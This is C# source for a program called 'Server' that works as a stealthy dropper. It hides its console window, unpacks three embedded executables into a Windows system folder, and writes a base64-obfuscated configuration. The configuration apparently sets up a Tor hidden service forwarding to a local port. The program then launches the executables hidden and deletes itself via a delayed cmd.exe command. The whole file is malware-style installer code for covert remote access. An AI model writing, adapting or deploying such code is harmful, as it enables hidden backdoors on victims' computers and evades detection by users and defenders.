using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Reflection;
using System.IO;
using System.IO.Compression;

namespace Server
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("shell32.dll")]
        public static extern bool SHGetSpecialFolderPath(IntPtr hwndOwner, [Out]StringBuilder lpszPath, int nFolder, bool fCreate);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        const string CONFIG = "U29ja3NMaXN0ZW5BZGRyZXNzIDEyNy4wLjAuMTo1Njc4OA0KSGlkZGVuU2VydmljZURpciBfX1RBUkdFVF9fDQpIaWRkZW5TZXJ2aWNlUG9ydCA1Njc4OSAxMjcuMC4wLjE6NTY3ODkNCkNvbnRyb2xQb3J0IDU2Nzkw";

        public static string GetSystemDirectory()
        {
            StringBuilder path = new StringBuilder(260);
            SHGetSpecialFolderPath(IntPtr.Zero, path, 0x0029, false);
            return path.ToString();
        }

        public static void SaveResourceToDisk(string ResourceName, string FileToExtractTo)
        {
            Stream s = Assembly.GetExecutingAssembly().GetManifestResourceStream(ResourceName);
            FileStream resourceFile = new FileStream(FileToExtractTo, FileMode.Create);

            byte[] b = new byte[s.Length + 1];
            s.Read(b, 0, Convert.ToInt32(s.Length));
            resourceFile.Write(b, 0, Convert.ToInt32(b.Length - 1));
            resourceFile.Flush();
            resourceFile.Close();

            resourceFile = null;
        }

        public static void execute(string file, string arguments = "", string workingDirectory = null, bool wait = false)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = file;
            startInfo.Arguments = arguments;
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            if (workingDirectory != null)
                startInfo.WorkingDirectory = workingDirectory;

            try
            {
                if (wait)
                {
                    using (Process exeProcess = Process.Start(startInfo))
                        exeProcess.WaitForExit();
                }
                else
                    Process.Start(startInfo);
            }
            catch (Exception)
            { }
        }

        public static string b64d(string str)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(str));
        }

        static byte[] Decompress(byte[] gzip)
        {
            using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
            {
                const int size = 4096;
                byte[] buffer = new byte[size];
                using (MemoryStream memory = new MemoryStream())
                {
                    int count = 0;
                    do
                    {
                        count = stream.Read(buffer, 0, size);
                        if (count > 0)
                        {
                            memory.Write(buffer, 0, count);
                        }
                    }
                    while (count > 0);
                    return memory.ToArray();
                }
            }
        }

        static void deleteSelf()
        {
            string AppPath = System.IO.Path.GetDirectoryName(Assembly.GetEntryAssembly().Location).ToString() + "\\Server.exe";

            ProcessStartInfo Info = new ProcessStartInfo();
            Info.Arguments = "/C choice /C Y /N /D Y /T 0 & Del " + AppPath;
            Info.WindowStyle = ProcessWindowStyle.Hidden;
            Info.CreateNoWindow = true;
            Info.FileName = "cmd.exe";
            Process.Start(Info);
        }

        static void Main(string[] args)
        {
            // hide window
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            // runtime variables
            string extFile = null;

            // create working path
            string systemPath = GetSystemDirectory() + @"\com\tmp\";
            if (!Directory.Exists(systemPath))
                Directory.CreateDirectory(systemPath);

            // extractor variables
            string extPackFile = systemPath + "ext.pack";

            // server variables
            string netFile = systemPath + "net.exe";
            string netPackFile = systemPath + "net.pack";

            // service variables
            string serviceFile = systemPath + "service.exe";
            string servicePackFile = systemPath + "service.pack";

            // extract decompressor
            if (!File.Exists(netFile) || !File.Exists(serviceFile))
            {
                extFile = systemPath + "ext.exe";
                if (!File.Exists(extFile))
                {
                    SaveResourceToDisk("Server.Resources.ext.pack", extPackFile);
                    byte[] file = File.ReadAllBytes(extPackFile);
                    byte[] decompressed = Decompress(file);
                    File.WriteAllBytes(extFile, decompressed);
                    File.Delete(extPackFile);
                }
            }

            // installing server
            if (!File.Exists(netFile))
            {
                // copy compressed server
                if (!File.Exists(netPackFile))
                    SaveResourceToDisk("Server.Resources.net.pack", netPackFile);

                // uncompress server
                execute(extFile, " e net.pack -bd -y", systemPath, true);

                // remove old stuff
                File.Delete(netPackFile);
            }

            // installing service
            if (!File.Exists(serviceFile))
            {
                // copy compressed server
                if (!File.Exists(servicePackFile))
                    SaveResourceToDisk("Server.Resources.service.pack", servicePackFile);

                // uncompress server
                execute(extFile, " e service.pack -bd -y", systemPath, true);

                // remove old stuff
                File.Delete(servicePackFile);
            }

            // remove old stuff
            File.Delete(extFile);

            // create config file
            string configFile = b64d(CONFIG).Replace("__TARGET__", systemPath.Remove(systemPath.Length - 1, 1) + "/");
            string configFileTarget = systemPath + "rc";
            if (!File.Exists(configFileTarget))
                File.WriteAllText(configFileTarget, configFile);

            // starting server
            execute(netFile, " -f rc", systemPath);

            // starting service
            execute(serviceFile, "", systemPath);

            // deleting this executable
            deleteSelf();
        }
    }
}
